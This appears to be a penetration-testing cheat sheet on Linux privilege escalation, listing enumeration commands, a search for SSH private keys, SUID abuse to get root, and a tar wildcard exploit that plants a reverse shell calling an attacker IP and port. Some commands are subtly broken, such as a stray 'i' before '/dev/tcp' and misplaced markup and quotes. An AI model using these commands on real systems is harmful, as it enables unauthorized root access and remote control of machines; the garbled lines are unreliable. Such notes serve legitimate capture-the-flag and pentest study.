---
title: 5 – Privesc Linux
summary: Privilege Escalation step – a note for elevating privileges on a Linux machine.
description: Privilege Escalation step – a note for elevating privileges on a Linux machine.
---

# Privesc Checklist

---

 > 
 > **<font color=red>sudo -l</font>**</br>
 > Display commands allowed to run with root privileges.

 > 
 > **<font color=red>history</font>**</br>
 > Show shell history.

 > 
 > **<font color=red>env</font>**</br>
 > Show environment variables.

 > 
 > **<font color=red>find / -perm -u=s -type f 2>/dev/null</font>**</br>
 > Search for commands with SUID enabled (then check [https://gtfobins.github.io/](https://gtfobins.github.io/)) 

 > 
 > **<font color=red>getcap -r / 2>/dev/null</font>**</br>
 > Search for commands with capabilities (then check [https://gtfobins.github.io/](https://gtfobins.github.io/)) 

 > 
 > **<font color=red>find / -writable 2>/dev/null</font>**</br>
 > Search for writable folders.

 > 
 > **<font color=red>\<find / -name id_rsa 2> /dev/null/br></font>**</br>
 > Search for SSH private keys.

 > 
 > **<font color=red>cat /etc/crontab</font>**</br>
 > Looking for automated scripts.

# Others Suggestions

---

* Determining the kernel of the machine and search for kernel exploitation (such as Dirtyc0w).
* Misconfigured file and directory permissions.
* pspy (process snooping): https://github.com/DominicBreuker/pspy 

# Automated Scripts

---

### LINPEAS

https://github.com/carlospolop/PEASS-ng/releases

 > 
 > **<font color=red>./linpeas.sh</font>**

---

### LINEUM

https://github.com/rebootuser/LinEnum

 > 
 > **<font color=red>./LinEnum.sh</font>**

# SUID Examples

---

### CP

 > 
 > **<font color=red>cp /root/</font> /home/myUser/**</br>
 > **<font color=red>cd</font> /home/myUser/root**</br>
 > Access root content.

---

### BASH

 > 
 > **<font color=red>bash -p</font>**</br>
 > Get a root shell.

# Wildcard Exploitation

---

### Resource

[https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)

### Example

Script running as root:

 > 
 > **tar cf /home/myUser/backups/backup.tgz \***

Exploit:

 > 
 > **<font color=red>echo "bash -i >& i/dev/tcp/</font>\[ATTACKER IP\]<font color=red>/</font>\[ATTACKER PORT\] <font color=red>0>&1" > </font>revshell.sh**</br>
 > **<font color=red>touch "</font>/home/myUser/backups/<font color=red>--checkpoint-action=exec=</font>sh revshell.sh<font color=red>"</font>**</br>
 > **<font color=red>touch "</font>/home/myUser/<font color=red>"--checkpoint=1"</font>**</br>
